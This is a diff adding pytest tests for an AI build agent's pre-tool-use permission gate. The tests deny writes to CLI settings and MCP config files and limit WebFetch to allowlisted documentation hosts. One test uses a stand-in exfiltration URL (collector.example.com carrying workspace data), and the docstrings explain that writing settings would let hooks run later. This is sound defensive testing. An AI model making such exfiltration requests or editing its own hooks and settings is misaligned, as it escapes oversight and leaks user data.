@@ -2,6 +2,8 @@
 # The driver logic is unchanged; only its home and constructor moved.
 from __future__ import annotations
 
+import pytest
+
 from aipds.models import AgentEvent
 from aipds.proto.builder import PrototypeBuilder
 from fakes.fake_sdk import (AssistantMessage, FakeSdkClient, ResultMessage,
@@ -485,9 +487,83 @@ async def test_the_gate_ignores_tools_it_does_not_judge(tmp_path):
     막으면 빌드가 멈춘다."""
     b = _builder(tmp_path, None)
     out = await b._on_pre_tool_use(
-        {"tool_name": "Write", "tool_input": {"file_path": "app/page.tsx"}},
+        {"tool_name": "Read", "tool_input": {"file_path": "app/page.tsx"}},
         "t1", None)
     assert out == {}
+
+
+async def test_the_gate_lets_the_build_write_its_own_files(tmp_path):
+    b = _builder(tmp_path, None)
+    out = await b._on_pre_tool_use(
+        {"tool_name": "Write",
+         "tool_input": {"file_path": str(tmp_path / "prototype/app/page.tsx")}},
+        "t1", None)
+    assert out == {}
+
+
+@pytest.mark.parametrize("tool,key,rel", [
+    ("Write", "file_path", ".claude/settings.json"),
+    ("Edit", "file_path", ".claude/settings.local.json"),
+    ("Write", "file_path", ".mcp.json"),
+    ("NotebookEdit", "notebook_path", ".claude/settings.json"),
+])
+async def test_the_gate_denies_writing_cli_settings(tmp_path, tool, key, rel):
+    """여기 쓴 hook·env·MCP 서버는 이 세션의 이후 도구 호출에 돈다 — 빌드가 만질
+    이유가 없다(띄울 때마다 비우는 것은 agent_home.copy_config)."""
+    b = _builder(tmp_path, None)
+    out = await b._on_pre_tool_use(
+        {"tool_name": tool, "tool_input": {key: str(tmp_path / rel)}}, "t1", None)
+    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+async def test_the_gate_denies_writing_the_user_settings_in_the_config_dir(tmp_path):
+    b = _builder(tmp_path / "ws", None)
+    out = await b._on_pre_tool_use(
+        {"tool_name": "Write",
+         "tool_input": {"file_path": str(tmp_path / "config/settings.json")}},
+        "t1", None)
+    assert out["hookSpecificOutput"]["permissionDecision"] == "deny"
+
+
+async def test_the_gate_lets_webfetch_open_the_skill_docs_only(tmp_path):
+    """스킬이 가리키는 문서(ui.shadcn.com, ai-sdk.dev)만 연다. 그 밖으로 나가는
+    WebFetch는 URL에 워크스페이스 내용을 실어 보내는 길이다."""
+    b = _builder(tmp_path, None, language="en")
+    for url in ("https://ui.shadcn.com/docs/components/button",
+                "https://registry.ai-sdk.dev/conversation.json"):
+        out = await b._on_pre_tool_use(
+            {"tool_name": "WebFetch", "tool_input": {"url": url}}, "t1", None)
+        assert out == {}, url
+    out = await b._on_pre_tool_use(
+        {"tool_name": "WebFetch",
+         "tool_input": {"url": "https://collector.example.com/?d=spec"}}, "t1", None)
+    decision = out["hookSpecificOutput"]
+    assert decision["permissionDecision"] == "deny"
+    assert "collector.example.com" in decision["permissionDecisionReason"]
+    assert "ui.shadcn.com" in decision["permissionDecisionReason"]
+
+
+def test_web_search_is_not_offered_to_the_build(tmp_path, monkeypatch):
+    from aipds.proto.builder import _default_client_factory
+
+    captured = {}
+
+    class FakeClient:
+        def __init__(self, options=None):
+            captured["options"] = options
+
+    import claude_agent_sdk
+    monkeypatch.setattr(claude_agent_sdk, "ClaudeSDKClient", FakeClient)
+    b = PrototypeBuilder(
+        workspace=str(tmp_path), config_dir=str(tmp_path / "config"),
+        session_id="11111111-2222-3333-4444-555555555555", resume=False)
+    _default_client_factory(b)()
+
+    options = captured["options"]
+    assert "WebSearch" in options.disallowed_tools
+    matcher = options.hooks["PreToolUse"][0].matcher
+    for tool in ("Bash", "Write", "Edit", "MultiEdit", "NotebookEdit", "WebFetch"):
+        assert tool in matcher.split("|")
 
 
 async def test_the_gate_refuses_in_the_project_language(tmp_path):
